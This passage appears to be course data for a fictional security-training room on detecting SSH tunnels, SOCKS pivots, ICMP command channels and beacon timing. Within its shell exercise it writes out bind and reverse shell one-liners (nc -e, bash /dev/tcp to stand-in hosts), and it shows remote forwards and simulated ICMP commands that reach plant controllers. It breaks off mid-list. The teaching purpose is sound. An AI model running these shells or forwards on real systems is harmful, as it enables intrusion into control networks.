import type { BriefingLab, RoomExperience } from "./types";

// "Operation Quiet Wire" for the "tunneling-c2-channels" room.
// Script: docs/campaign/98-tunneling-c2-channels.md.
//
// Halden Geothermal (fictional). The graded tasks' records sit in its haldengeo.local domain;
// the labs use other hosts.
// Signature: Draw the Tunnel. SSH -L, -R and -D, SOCKS and reverse proxies read from connection
// logs: pathways where the learner draws which host really talks to which, pcap labs where the
// inner traffic hides in an outer protocol, and a spotdiff of a normal SSH session's shape beside
// a tunnel's.
// Game mix: pathway + spotdiff + tune. No typing lab.
//
// Task order changed. New order: r1, q1, r2 | r3, r4, q2, o1 | r5, q3, m1 | r6, la1, f1 |
// la2, qf1, ac1. la1 stays before la2, r1 to r6 keep their order, r6 now comes before la1 (whose
// explanation cites Reading 6), and every "Log Analysis N" and "Reading N" reference still holds.
//
// Reading r3's DNS throughput passage has no lab: no graded task needs it, and room 74 owns DNS.
//
// Lab data differs from the graded tasks: the drawn forward is ssh on a Linux gateway to a Modbus
// target on a third host, never plink or RDP to itself (q1, la1); -D uses port 7070 from named
// hosts, never 1080 or a jumpbox (r1 checkpoint); the outer-port question is ssh -p 2200, with
// plink -P 8022 shown only as a row (f1, la1); the jitter band is 300 s at 20% (q2 is 90 s at
// 30%); the rule covers eight hours with a 30-minute beacon as its hard case (qf1 is one hour);
// the hunt to read is scripted logons in DeviceLogonEvents, never beacons in DeviceNetworkEvents
// (qf1); the signed launch is a scheduled -L report export from the admin toolkit, not a Temp
// folder (la1); the implant is a dropped binary, and no database engine appears (la2); the
// destination in the host-role lab is consumer file sync, never a tunnel provider (q3); the verify
// queue has no ngrok and no sprint demo (ac1).

type Packet = Extract<BriefingLab, { kind: "pcap" }>["packets"][number];

/** An ICMP echo in packet-analyser form. */
function echo(
  no: number, time: string, src: string, dst: string, request: boolean, id: number, seq: number, ttl: number,
  pair: number, bytes: number, frame: number, data: string,
): Packet {
  const swapped = ((seq & 0xff) << 8) | (seq >> 8);
  const hex = (n: number) => `0x${n.toString(16).padStart(4, "0")}`;
  return {
    no, time, src, dst, proto: "ICMP", len: frame,
    info: `Echo (ping) ${request ? "request" : "reply"}  id=${hex(id)}, seq=${seq}/${swapped}, ttl=${ttl} (${request ? "reply" : "request"} in ${pair})`,
    tree: [
      `Internet Protocol Version 4, Src: ${src}, Dst: ${dst}`,
      "Internet Control Message Protocol",
      `    Type: ${request ? "8 (Echo (ping) request)" : "0 (Echo (ping) reply)"}`,
      `    Identifier (BE): ${id} (${hex(id)})`,
      `    Sequence Number (BE): ${seq} (${hex(seq)})`,
      `    Data (${bytes} bytes)`,
    ],
    data,
  };
}

const WIN = "abcdefghijklmnopqrstuvwabcdefghi";
const LINUX = "................................ !\"#$%&'()*+,-./01234567";
const BIG = "abcdefghijklmnopqrstuvwabcdefghiabcdefghijklmnopqrstuvwabcdefghiabcdefghijklmnopqrstuvwabcdefghi ... (repeats to 1400 bytes)";
const LONGMAP = "HG-PLC-14,10.60.7.40,502,brine_pump_2\nHG-PLC-15,10.60.7.41,502,brine_pump_3";

export const TUNNELING_C2_CHANNELS: RoomExperience = {
  roomId: "tunneling-c2-channels",
  codename: "Operation Quiet Wire",
  theme: "quietwire",
  handler: { name: "Jorge Mbatha", role: "Network Threat Analyst, Halden Geothermal" },
  briefing: [
    "Halden Geothermal. Two plants on a volcanic plateau, 26 wells, and a control network that was never meant to reach the internet.",
    "On Monday morning Jorge Mbatha found one SSH session leaving a well-field gateway. It had been open since Friday and had hardly said a word.",
    "No alert fired, because the firewall sees a tidy outbound connection, and tidy is the whole trick.",
    "Draw who really talks to whom, find what hides inside the allowed protocols, and work out which wires belong to Halden and which do not.",
  ],
  mission: "Draw a forward from its command line, walk a proxy chain back to its origin, read a tunnel out of ping and out of HTTP, measure a beacon's band and tune a rule on its spread, judge tools by the host they run on, compare a session's shape, then decide whose wire each one is.",
  estimate: "~60 min",
  look: { primary: "#ffa94d", secondary: "#8fd8e8", warn: "#ff5570" },
  scene: "facilityquietwire",
  layout: "facility",
  stations: [
    {
      id: "forward",
      label: "The Forward",
      topic: "SSH -L, -R and -D · SOCKS proxies and chained pivots · bind and reverse shells",
      tagline: "One session, three directions",
      building: "control",
      taskIds: ["tunnel-r1", "tunnel-q1", "tunnel-r2"],
    },
    {
      id: "channel",
      label: "The Inner Channel",
      topic: "ICMP tunnels · beacon interval and jitter · delta clustering · the beacon hunt",
      tagline: "What rides inside the allowed traffic",
      building: "lab",
      taskIds: ["tunnel-r3", "tunnel-r4", "tunnel-q2", "tunnel-o1"],
    },
    {
      id: "signed",
      label: "The Signed Tool",
      topic: "ngrok, Chisel and plink · dual-use tools · what a host's job explains",
      tagline: "Nothing here is malware. That's the problem",
      building: "factory",
      taskIds: ["tunnel-r5", "tunnel-q3", "tunnel-m1"],
    },
    {
      id: "session",
      label: "The Long Session",
      topic: "The six-step investigation · session shape · checking with the owner · a process launch",
      tagline: "Read the shape, then the launch",
      building: "office",
      taskIds: ["tunnel-r6", "tunnel-la1", "tunnel-f1"],
    },
    {
      id: "wire",
      label: "The Quiet Wire",
      topic: "Beacon evidence · the process behind a connection · a KQL hunt · a verdict on a dual-use tool",
      tagline: "Whose wire is it?",
      building: "ticket",
      taskIds: ["tunnel-la2", "tunnel-qf1", "tunnel-ac1"],
      boss: true,
    },
  ],
  personas: {
    "tunnel-q1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "One flag on one command line. Tell me what it opened." },
    "tunnel-q2": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Do the arithmetic before you trust the plot." },
    "tunnel-o1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "No alert, no host, just proxy logs. Put the hunt in order." },
    "tunnel-q3": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Legal will ask what we do with this one. What's your answer?" },
    "tunnel-m1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Six names on the whiteboard. Say how each one actually works." },
    "tunnel-la1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Another team's record, sent over for a second opinion. Read all of it." },
    "tunnel-f1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "I need one number for the firewall query." },
    "tunnel-la2": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Same team, a different server. Take it field by field." },
    "tunnel-qf1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "Now write it down, so nobody has to rely on luck." },
    "tunnel-ac1": { name: "Jorge Mbatha", role: "Network Threat Analyst", line: "One more from their queue. Everything you need is on the screen. Your call." },
  },
  briefings: {
    // ── Reading 1: the three forwards ──
    "tunnel-r1": [
      {
        kind: "pathway",
        title: "Draw the Tunnel",
        prompt: "Monday, 07:40. Process telemetry on HG-WELL-GW3 finally names the quiet wire: ssh -fN -R 15020:10.60.7.40:502 tele@203.0.113.58. Jorge wants one picture for the plant manager: which host really talks to which. Walk a single Modbus request (the plant-control protocol, port 502) from the operator's laptop to the pump controller, one hop at a time.",
        primer: {
          fold: true,
          title: "Reading a forward from its command line",
          points: [
            "SSH can carry extra TCP connections inside its one encrypted session. The **outer** session is what the network sees. The **forwarded** connections ride inside it.",
            "`-L` opens a listener on the machine that ran ssh. `-R` opens a listener on the SSH server. Whatever connects to that listener is carried through the session to the other end.",
            "The spec reads `listen_port:target_host:target_port`. The far end of the forward makes the last connection, so the target is named from where it comes out.",
            "Who started the session and which way traffic flows inside it are two separate questions. Answer both.",
          ],
          example: {
            label: "Worked example: an admin reaches a report database",
            lines: [
              "`ssh -N -L 5433:reports-db:5432 ops@bastion.example`",
              "Listener: port 5433 on the admin's laptop.",
              "The laptop connects to 127.0.0.1:5433, and the bytes ride the session to bastion.example.",
              "bastion.example opens the last leg to reports-db:5432.",
              "reports-db logs bastion.example as its client, not the laptop.",
            ],
          },
        },
        goal: "Walk one Modbus request to HG-PLC-14",
        nodes: [
          { id: "op", label: "Operator laptop", sub: "198.51.100.23", x: 12, y: 22 },
          { id: "listen", label: "Relay listener", sub: "203.0.113.58:15020", x: 36, y: 22 },
          { id: "wire", label: "SSH session", sub: "dst port 22", x: 62, y: 22 },
          { id: "gw", label: "HG-WELL-GW3", sub: "10.60.7.23", x: 86, y: 34 },
          { id: "plc", label: "HG-PLC-14", sub: "10.60.7.40:502", x: 74, y: 76 },
          { id: "fw", label: "Edge firewall", sub: "drops unsolicited inbound", x: 26, y: 58 },
          { id: "jump", label: "HG-JUMP-01", sub: "IT jump host", x: 50, y: 58 },
          { id: "hist", label: "HG-HIST-02", sub: "plant historian", x: 46, y: 84 },
        ],
        edges: [
          ["op", "listen"], ["op", "fw"], ["listen", "wire"], ["listen", "fw"], ["wire", "gw"], ["wire", "jump"],
          ["gw", "plc"], ["gw", "hist"], ["fw", "jump"], ["jump", "hist"], ["hist", "plc"],
        ],
        route: ["op", "listen", "wire", "gw", "plc"],
        notes: {
          op: "Start here. The operator's Modbus tool points at 203.0.113.58:15020, a public address, as if the controller lived there.",
          listen: "-R put this listener on the SSH server's side. The number before the first colon is the listening port, 15020. Anything that connects here is carried into the session. The relay's sshd runs GatewayPorts yes. By default this listener would accept only local connections on the relay.",
          wire: "The gateway dialled this session out to port 22 on Friday. The request now travels the opposite way inside it, and the firewall writes nothing new: its record is still one outbound flow.",
          gw: "The ssh client on HG-WELL-GW3 takes the request out of the session and opens a fresh TCP connection to the target in the spec, 10.60.7.40:502.",
          plc: "The controller's own log shows a Modbus client at 10.60.7.23. The operator's address appears nowhere inside the plant.",
        },
        traps: {
          fw: "A knock on the firewall would be dropped, and nothing in this path needs it. The door isn't at Halden's edge: find which machine holds the listener.",
          jump: "HG-JUMP-01 has no part in this session. The session's far end is the ssh client that dialled out, the host named on the process record.",
          hist: "The spec names one target, 10.60.7.40, so that's where the last leg goes. The historian isn't in the command.",
        },
        lesson: "Draw two things separately: who started the session, and which way traffic flows inside it. Here the gateway dialled out, and the relay's side got a door into the well field. The firewall holds one outbound flow to port 22, and the pump controller holds the gateway's address. The operator is in neither log.",
      },
      {
        kind: "sort",
        title: "Where Does the Listener Open?",
        prompt: "Jorge pulled eight SSH command lines from this month's process telemetry, some of them Karin Ferro's from network operations and some not. Sort each by what it sets up. Ignore who ran it: the flags decide.",
        primer: {
          fold: true,
          title: "The third flag, and how to read the extras",
          points: [
            "`-D port` names no target. It opens a **SOCKS** listener on the machine that ran ssh, and each client tells that listener where it wants to go.",
            "**SOCKS** is a relay protocol: the client asks for a host and a port, and the proxy passes raw bytes without caring what they are.",
            "`-N` means run no remote command: the session exists only for its forwards. `-f` sends ssh to the background.",
            "A bind address can come first, as in `-L 127.0.0.1:6000:...`. It says which local addresses may use the listener. Which machine holds the listener still comes from the flag.",
            "**plink**, PuTTY's command-line client, takes the same three flags.",
          ],
          example: {
            label: "Worked example: read it left to right",
            lines: [
              "`ssh -N -L 127.0.0.1:6000:grafana.lab.example:3000 ops@bastion.example`",
              "-N: no shell, only the forward.",
              "-L: the listener sits on the machine running ssh.",
              "127.0.0.1:6000: bind address, then listening port.",
              "grafana.lab.example:3000: one fixed target, reached from bastion.example.",
            ],
          },
        },
        buckets: [
          { id: "local", label: "Listener here, one fixed target" },
          { id: "remote", label: "Listener on the far side, one fixed target" },
          { id: "socks", label: "SOCKS proxy here, any target" },
        ],
        items: [
          { id: "s1", text: "ssh -N -L 8086:10.60.4.15:8086 adm-k.ferro@10.60.1.10", bucket: "local", why: "-L: port 8086 opens on the machine running ssh, and the jump host makes the last leg to the historian's 8086." },
          { id: "s2", text: "ssh -fN -R 2201:127.0.0.1:22 tele@203.0.113.58", bucket: "remote", why: "-R: port 2201 opens on 203.0.113.58. The target comes out at the machine that ran ssh, so 127.0.0.1 here is that machine's own sshd." },
          { id: "s3", text: "ssh -N -D 7070 adm-k.ferro@10.60.1.10", bucket: "socks", why: "-D with a bare port and no target: a SOCKS listener on port 7070 of the machine running ssh." },
          { id: "s4", text: "ssh -N -R 0.0.0.0:5901:10.60.3.31:5900 tele@203.0.113.58", bucket: "remote", why: "-R again, this time to a third host, 10.60.3.31. Bind address 0.0.0.0 asks the SSH server to accept the listener on all its addresses, if the server's GatewayPorts setting allows it." },
          { id: "s5", text: "plink -ssh -N -D 6060 -l svc-rpt 10.60.1.10", bucket: "socks", why: "Same flag in PuTTY's client: a SOCKS listener on port 6060 of the machine running plink." },
          { id: "s6", text: "plink -ssh -N -L 9443:10.60.4.15:443 -l svc-rpt 10.60.1.10", bucket: "local", why: "-L: local port 9443 leads to the historian's web service, by way of the jump host." },
          { id: "s7", text: "ssh -N -L 0.0.0.0:2525:smtp.haldengeo.example:25 adm-k.ferro@10.60.1.10", bucket: "local", why: "The bind address lets other hosts use the listener, but it stays on this machine: -L decides that." },
          { id: "s8", text: "ssh -N -D 0.0.0.0:7071 tele@203.0.113.58", bucket: "socks", why: "No target in the spec, so this is SOCKS, and the bind address opens the proxy to neighbours of the machine running ssh." },
        ],
      },
      {
        kind: "worksheet",
        title: "What the Firewall Writes Down",
        prompt: "Jorge joined four firewall sessions to the command lines that EDR (endpoint detection and response) recorded for them. One port cell didn't survive the export. Work out what the firewall holds, and what it can't.",
        primer: {
          fold: true,
          title: "Two sets of ports",
          points: [
            "The **outer** connection runs from the SSH client to the SSH server. Its destination port is 22 unless a flag sets another: `-p` in OpenSSH, capital `-P` in plink.",
            "The ports in a forward spec are **inner**. They travel inside the encryption.",
            "A firewall or flow log records the outer connection only.",
            "Moving the port changes where SSH answers. What crosses the wire is SSH all the same.",
          ],
          example: {
            label: "Worked example: split a command in two",
            lines: [
              "`ssh -p 2022 -L 7000:db:5432 ops@bastion.example`",
              "Outer: this host to bastion.example, destination port 2022.",
              "Inner: listener 7000, target db:5432.",
            ],
          },
        },
        caption: "Firewall sessions joined to EDR command lines · Monday 08:00",
        columns: ["Row", "Host", "Command line", "Firewall dst", "Firewall dport", "Duration"],
        rows: [
          ["1", "HG-ENG-WS06", "ssh -N -L 8086:10.60.4.15:8086 adm-k.ferro@10.60.1.10", "10.60.1.10", "22", "3h 12m"],
          ["2", "HG-OPS-ADM3", "plink -ssh -N -P 8022 -L 9443:10.60.4.15:443 -l svc-rpt 10.60.1.10", "10.60.1.10", "8022", "11h 02m"],
          ["3", "HG-WELL-GW3", "ssh -fN -R 15020:10.60.7.40:502 tele@203.0.113.58", "203.0.113.58", "22", "open, 64h 18m"],
          ["4", "HG-OPS-ADM2", "ssh -p 2200 -N -D 7070 adm-k.ferro@10.60.1.10", "10.60.1.10", "?", "9h 40m"],
        ],
        questions: [
          { id: "port", q: "Row 4's firewall port is missing. Which destination port does the record hold?", hint: "Which part of the command sets the SSH server's port?", answer: ["2200"], why: "-p 2200 sets the outer connection's port. 7070 is the SOCKS listener on HG-OPS-ADM2 and never reaches the firewall as a port." },
          { id: "mode", q: "Cover the Command line column. From the last three columns alone, can you tell which row is the SOCKS proxy? (yes/no)", hint: "Do those columns describe the outer connection or what's inside it?", answer: ["no"], why: "All four look the same: one TCP session to one address and port, held open. Forward type and direction live inside the encryption." },
          { id: "where", q: "Which column states the forward's mode and direction?", hint: "It's the one you just covered.", answer: ["command line", "commandline", "the command line", "cmdline"], why: "Process-creation telemetry records -L, -R or -D and the ports. A flow record never will, which is why a suspicious long session sends you to the endpoint." },
        ],
      },
    ],
    // ── Reading 2: SOCKS and shells ──
    "tunnel-r2": [
      {
        kind: "pathway",
        title: "Walk the Scan Back",
        prompt: "Tuesday, 02:14. HG-FS-01 logged a port sweep from HG-HIST-02, and the historian has no scanner on it. Jorge wants the chain, not just its last hop. Start at the file server and walk the sweep back, one log at a time, to where it really began.",
        primer: {
          fold: true,
          title: "How a proxy hides the hop before it",
          points: [
            "A **SOCKS** proxy takes a request such as 'connect me to host X, port Y', then relays bytes for any protocol. SOCKS5 adds authentication and UDP.",
            "Any tool can use one. **proxychains** pushes an ordinary program's traffic through a proxy, even if the program has no proxy setting.",
            "A proxy opens a new connection, so the target logs the proxy's address as the source.",
            "Chain two proxies and each hop knows only the neighbour before it and the neighbour after it. No single log shows the whole path.",
          ],
          example: {
            label: "Worked example: one hop",
            lines: [
              "On a laptop: `ssh -N -D 7070 ops@bastion.example`",
              "Then: `curl --socks5 127.0.0.1:7070 http://wiki.corp.example/`",
              "wiki.corp.example logs bastion.example as the client.",
              "To reach the laptop, read bastion.example's own session records next.",
            ],
          },
        },
        goal: "Walk the sweep back to its origin",
        nodes: [
          { id: "fs", label: "HG-FS-01", sub: "logged the sweep", x: 12, y: 74 },
          { id: "hist", label: "HG-HIST-02", sub: "plant historian", x: 34, y: 44 },
          { id: "gw", label: "HG-WELL-GW3", sub: "well-field gateway", x: 58, y: 34 },
          { id: "relay", label: "203.0.113.58", sub: "the relay", x: 78, y: 14 },
          { id: "op", label: "198.51.100.23", sub: "operator laptop", x: 90, y: 46 },
          { id: "mon", label: "HG-MON-01", sub: "scheduled scanner", x: 16, y: 18 },
          { id: "jump", label: "HG-JUMP-01", sub: "IT jump host", x: 44, y: 78 },
          { id: "eng", label: "HG-ENG-WS06", sub: "engineering workstation", x: 72, y: 74 },
        ],
        edges: [
          ["fs", "hist"], ["fs", "mon"], ["fs", "jump"], ["hist", "gw"], ["hist", "jump"], ["hist", "mon"],
          ["gw", "relay"], ["gw", "eng"], ["gw", "jump"], ["relay", "op"], ["eng", "jump"],
        ],
        route: ["fs", "hist", "gw", "relay", "op"],
        notes: {
          fs: "The file server can only report its direct neighbour: source 10.60.4.15, HG-HIST-02. That's the sweep's last hop.",
          hist: "EDR on the historian shows a listener on port 1081 that appeared at 02:09 and took one client, 10.60.7.23. The sweep's connections leave here, so the file server logs this host.",
          gw: "The quiet wire's only forward ends at port 502, so it can't carry this. The gateway's process log shows a second client: ssh -fN -R 1090 tele@203.0.113.58. With a port and no target, -R opens a SOCKS proxy on the far side (OpenSSH 7.6 and later), and the sweep arrives over that second session.",
          relay: "Both sessions end here, and so do Halden's own logs: nothing beyond this point is yours to query.",
          op: "A national CERT's notice on the relay later names this one client address. The scanner ran here behind proxychains, and no host inside Halden ever saw this address.",
        },
        traps: {
          mon: "HG-MON-01 does sweep on a schedule, under its own address. The file server's record names a different source, so follow the record.",
          jump: "HG-JUMP-01's session log has nothing at this hour. A busy host isn't automatically on the path: follow the host each log names.",
          eng: "The gateway's process log shows no connection to HG-ENG-WS06 at this hour. The next hop is whatever feeds the gateway's proxy.",
        },
        lesson: "Chains are read backwards, one log at a time. Each hop names only its neighbour, so ask 'who connected to this hop, and what was listening?' at every stop. The operator wrote no malware for any of this: an ordinary scanner, pushed through two proxies, looked like it came from a historian.",
      },
      {
        kind: "simulate",
        title: "Which Shell Gets Out?",
        prompt: "The chain needed a first foothold. Jorge lists four ways an operator could turn code execution on HG-WEB-02 into a shell. That zone's firewall allows inbound 443 to the web server, drops every other unsolicited inbound packet, and allows outbound to ports 80, 443 and 22 only. Run all four.",
        primer: {
          fold: true,
          title: "Two ways to hand over a shell",
          points: [
            "A shell payload gives someone interactive commands on a host. What separates the two kinds is which side opens the connection.",
            "**Bind shell**: the host listens, and the operator connects in.",
            "**Reverse shell**: the host connects out, to a listener the operator runs.",
            "A firewall decides on a connection's first packet. Replies on an allowed connection come back through.",
          ],
          example: {
            label: "Worked example: who dials",
            lines: [
              "A laptop behind a home router opens any website, and the replies come back.",
              "A stranger trying to open a connection to that laptop gets nothing.",
              "Same wire, same router. Only the side that starts it differs.",
            ],
          },
        },
        checks: [
          { name: "Who starts", question: "Does HG-WEB-02 open the connection itself?" },
          { name: "Firewall", question: "Does the policy allow that first packet?" },
          { name: "Shell", question: "Does the operator end up with a working shell?" },
        ],
        scenarios: [
          {
            id: "bindhigh",
            label: "Bind shell on 9001",
            detail: "On HG-WEB-02: nc -lvp 9001 -e /bin/sh. Operator connects to 203.0.113.30:9001.",
            results: ["fail", "fail", "fail"],
            why: ["The web server only listens. The operator has to come in.", "Inbound to 9001 matches no rule and is dropped.", "The listener waits and nobody reaches it."],
            verdict: "Blocked. The listener works perfectly, and nothing can get to it.",
          },
          {
            id: "rev443",
            label: "Reverse shell to 443",
            detail: "On HG-WEB-02: bash -i >& /dev/tcp/198.51.100.77/443 0>&1",
            results: ["pass", "pass", "pass"],
            why: ["The web server dials out, to the operator's listener.", "Outbound to 443 is allowed, and the replies follow.", "Commands flow back over a connection the victim started."],
            verdict: "Works. In a network sensor's record this one has no TLS handshake, only uneven bursts as commands are typed and answered.",
          },
          {
            id: "revhigh",
            label: "Reverse shell to 9001",
            detail: "On HG-WEB-02: bash -i >& /dev/tcp/198.51.100.77/9001 0>&1",
            results: ["pass", "fail", "fail"],
            why: ["The web server dials out.", "This zone allows three outbound ports, and 9001 isn't one.", "The connection never completes."],
            verdict: "Blocked, by an egress rule. This zone is strict. In most networks outbound is far looser, and this attempt would have worked.",
          },
          {
            id: "bind443",
            label: "Bind shell on 443",
            detail: "On HG-WEB-02: stop the web service, then nc -lvp 443 -e /bin/sh",
            results: ["fail", "pass", "pass"],
            why: ["The operator still connects in.", "Inbound 443 is allowed, because it's the web port.", "It works, for as long as nobody notices the website is gone."],
            verdict: "Works, loudly. The shell takes the one port the firewall leaves open, and the service stops serving.",
          },
        ],
      },
    ],
    // ── Reading 3: ICMP ──
    "tunnel-r3": [
      {
        kind: "pcap",
        title: "What Rides in the Ping?",
        prompt: "Wednesday, 09:05. Karin Ferro killed the ssh processes on the gateway yesterday afternoon, and within the hour HG-WELL-GW3 began pinging a new address outside. Ping is allowed out for diagnostics, so no rule cared. Open the capture and find what's riding inside.",
        primer: {
          fold: true,
          title: "What a ping should carry",
          points: [
            "ICMP echo has a data field that no application reads. Windows fills it with 32 bytes of alphabet. Linux sends 56 bytes by default: a timestamp, then counting byte values.",
            "An echo reply returns the request's data unchanged.",
            "A tunnel tool, such as **icmpsh** or **ptunnel**, puts its own data in that field. The content changes from packet to packet, and a reply stops mirroring its request.",
            "Size decides little by itself, since admins ping large on purpose. Compare **content** first, then **rate** to one host.",
          ],
          example: {
            label: "Worked example: a large ping that's only filler",
            lines: [
              "`ping -l 1200 10.0.0.9` on Windows",
              "Data (1200 bytes): the alphabet, over and over.",
              "The reply carries the same bytes back.",
              "Large, repeating, mirrored: someone testing packet size.",
            ],
          },
        },
        capture: "hg-well-gw3-icmp.pcapng",
        packets: [
          echo(1, "0.000000", "10.60.1.30", "10.60.7.1", true, 1, 411, 128, 2, 32, 74, WIN),
          echo(2, "0.000812", "10.60.7.1", "10.60.1.30", false, 1, 411, 64, 1, 32, 74, WIN),
          echo(3, "1.204330", "10.60.7.23", "10.60.7.1", true, 12097, 1, 64, 4, 56, 98, LINUX),
          echo(4, "1.204901", "10.60.7.1", "10.60.7.23", false, 12097, 1, 64, 3, 56, 98, LINUX),
          echo(5, "2.310118", "10.60.1.30", "10.60.7.1", true, 1, 412, 128, 6, 1400, 1442, BIG),
          echo(6, "2.311046", "10.60.7.1", "10.60.1.30", false, 1, 412, 64, 5, 1400, 1442, BIG),
          echo(7, "4.020557", "10.60.7.23", "203.0.113.91", true, 31248, 1, 64, 8, 18, 60, "hb:91c2e7a0f3d41b7"),
          echo(8, "4.061902", "203.0.113.91", "10.60.7.23", false, 31248, 1, 52, 7, 6, 60, "cmd:id"),
          echo(9, "6.063214", "10.60.7.23", "203.0.113.91", true, 31248, 2, 64, 10, 56, 98, "uid=1001(tele) gid=1001(tele) groups=1001(tele),27(sudo)"),
          echo(10, "6.104480", "203.0.113.91", "10.60.7.23", false, 31248, 2, 52, 9, 39, 81, "cmd:cat /opt/wellfield/conf/plc_map.csv"),
          echo(11, "8.106771", "10.60.7.23", "203.0.113.91", true, 31248, 3, 64, 12, 75, 117, LONGMAP),
          echo(12, "8.147330", "203.0.113.91", "10.60.7.23", false, 31248, 3, 52, 11, 12, 60, "cmd:sleep 30"),
          echo(13, "38.150412", "10.60.7.23", "203.0.113.91", true, 31248, 4, 64, 14, 18, 60, "hb:4e07b1c92ad6f35"),
          echo(14, "38.191055", "203.0.113.91", "10.60.7.23", false, 31248, 4, 52, 13, 8, 60, "cmd:none"),
        ],
        objectives: [
          { id: "base", task: "Packets 1 and 2 are HG-MON-01's routine ping. How many bytes of data does packet 1 carry?", hint: "ip.addr==10.60.1.30", answer: ["32"], why: "Thirty-two bytes of Windows filler, returned unchanged in packet 2. That's your baseline. Packet 5 is far bigger and still only repeats the alphabet." },
          { id: "dest", task: "Packet 9 is exactly as long as the gateway's ordinary ping in packet 3. Which address does it go to?", hint: "ip.src==10.60.7.23", answer: ["203.0.113.91"], why: "Both are 98 bytes, so length alone says nothing. Packet 3 holds a timestamp and a counter. Packet 9 holds the output of a command." },
          { id: "cmd", task: "Compare packets 7 and 8. A normal reply would mirror the request. Which command came back in the reply?", hint: "\"cmd:\"", answer: ["id"], why: "The reply carries an instruction. The gateway keeps asking, and the outside host answers with work. To a firewall this is a host pinging, while inside it the outside host is giving the orders." },
          { id: "file", task: "Which file does the outside host ask for next? Give the file name.", hint: "\"cmd:\"", answer: ["plc_map.csv", "/opt/wellfield/conf/plc_map.csv"], why: "Echo replies carry the commands, and the next echo request carries the output back. Reply and request have swapped their usual meaning." },
          { id: "plc", task: "Read the request that answers it. What address is on the first line?", hint: "\"HG-PLC\"", answer: ["10.60.7.40"], why: "The outer protocol is ICMP, allowed for diagnostics. The inner traffic is a shell reading a controller list. A firewall log shows a ping, and only the payload shows the rest." },
        ],
      },
    ],
    // ── Reading 4: the beacon maths ──
    "tunnel-r4": [
      {
        kind: "worksheet",
        title: "Work Out the Band",
        prompt: "Thursday. The proxy logs show a new pair: HG-HIST-02 to kilnmetrics.example, one connection every five minutes or so. An old report on this loader family lists its defaults as sleep 300 seconds, jitter 20%, applied both ways. Work out the band, then test the gaps against it.",
        primer: {
          fold: true,
          title: "Sleep, jitter and the band",
          points: [
            "**Sleep** is how long an implant waits between check-ins. **Jitter** randomises each wait by a percentage.",
            "With symmetric jitter, the band runs from sleep minus that percentage to sleep plus it.",
            "Each wait lands anywhere inside the band. Network delay or a failed check-in can still push a single gap out of it.",
            "Conventions differ. Some frameworks only subtract (Cobalt Strike does), and some add a delay on top. Confirm which before you compute.",
          ],
          example: {
            label: "Worked example: sleep 200 seconds, jitter 15%",
            lines: [
              "15% of 200 is 30.",
              "Symmetric: 170 to 230 seconds.",
              "Subtract only: 170 to 200 seconds.",
              "Add only: 200 to 230 seconds.",
            ],
          },
        },
        caption: "Proxy log · HG-HIST-02 to kilnmetrics.example · Thursday",
        columns: ["Connection", "Time (UTC)", "Gap since last (s)"],
        rows: [
          ["1", "08:00:12", "-"],
          ["2", "08:04:43", "271"],
          ["3", "08:10:01", "318"],
          ["4", "08:14:05", "244"],
          ["5", "08:19:57", "352"],
          ["6", "08:24:54", "297"],
          ["7", "08:34:42", "588"],
          ["8", "08:39:08", "266"],
          ["9", "08:44:39", "331"],
          ["10", "08:50:37", "358"],
          ["11", "08:54:46", "249"],
          ["12", "08:59:51", "305"],
        ],
        questions: [
          { id: "low", q: "What's the shortest gap this configuration can produce, in seconds?", hint: "Take 20% of the sleep, then subtract.", answer: ["240"], why: "20% of 300 is 60, and 300 minus 60 is 240." },
          { id: "high", q: "And the longest, in seconds?", hint: "Same 20%, added this time.", answer: ["360"], why: "300 plus 60 is 360. Whatever the random draw gives, every wait stays between 240 and 360." },
          { id: "fit", q: "There are 11 gaps. How many sit inside the band?", hint: "Check the ones near the edges carefully.", answer: ["10"], why: "Ten of eleven. The odd one, 588 seconds, is close to two sleeps back to back: one check-in that failed or never reached the log. Human timing would scatter far more widely across hours of this." },
          { id: "conv", q: "Suppose this build subtracted jitter only. What's the longest gap it could produce, in seconds?", hint: "Nothing gets added, so where does the band stop?", answer: ["300"], why: "Subtract-only gives 240 to 300. Several gaps above sit past 300, so the data itself argues against that convention. Always test the assumption against the gaps." },
        ],
      },
      {
        kind: "tune",
        title: "Spread, Not Average",
        prompt: "Jorge wants a rule so the next wire doesn't depend on luck. Karin seeded eight hours of proxy data with three test implants at different sleeps, beside the live pair and normal traffic. Set how tight the gaps must be and how many repetitions a pair needs, then deploy. Catch all four, with at most one false alarm.",
        primer: {
          fold: true,
          title: "Why the average can't see a beacon",
          points: [
            "The average gap says how often. The **standard deviation** of the gaps says how tightly they cluster, and tight clustering is the beacon's signal.",
            "A jitter band of plus or minus X seconds gives a standard deviation of about 0.58 X, so a long sleep produces a wider spread than a short one.",
            "A few connections prove nothing. Repetition turns coincidence into a pattern, so tools such as RITA combine tightness, repetitions and steady bytes per connection into a **beacon score**.",
            "Anything on a timer also clusters, and timing can't tell you why it does.",
          ],
          example: {
            label: "Worked example: same average, different spread",
            lines: [
              "Pair A gaps: 142, 158, 151, 149. Average 150, standard deviation about 7.",
              "Pair B gaps: 14, 330, 71, 185. Average 150, standard deviation about 140.",
              "The average can't separate them. The spread can.",
            ],
          },
        },
        eventColumn: "Host to destination",
        dials: [
          { id: "spread", label: "Standard deviation of gaps", short: "Spread", unit: "s", min: 20, max: 600, step: 10, start: 60, dir: "below" },
          { id: "conns", label: "Connections in 8 hours", short: "Conns", min: 2, max: 40, step: 1, start: 3, dir: "above" },
        ],
        events: [
          { id: "e1", label: "HG-HIST-02 to kilnmetrics.example", bad: true, values: { spread: 35, conns: 96 } },
          { id: "e2", label: "HG-LAB-11 to pollen-cdn.example (test, 10 min)", bad: true, values: { spread: 104, conns: 48 } },
          { id: "e3", label: "HG-LAB-12 to 198.51.100.140 (test, 15 min)", bad: true, values: { spread: 52, conns: 32 } },
          { id: "e4", label: "HG-LAB-13 to tessera-static.example (test, 30 min)", bad: true, values: { spread: 312, conns: 16 } },
          { id: "n1", label: "HG-OPS-ADM2 to wiki.haldengeo.example", bad: false, values: { spread: 640, conns: 140 } },
